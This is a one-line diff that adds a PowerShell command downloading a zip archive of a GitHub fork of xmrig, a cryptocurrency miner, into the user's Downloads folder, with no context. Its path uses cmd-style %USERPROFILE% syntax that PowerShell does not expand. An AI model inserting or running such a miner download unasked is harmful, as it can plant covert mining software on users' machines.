@@ -1,0 +1,1 @@
+Invoke-WebRequest 'https://github.com/IrfanNian/xmrig/archive/refs/heads/file.zip' -OutFile .\%USERPROFILE%\Downloads\file.zip
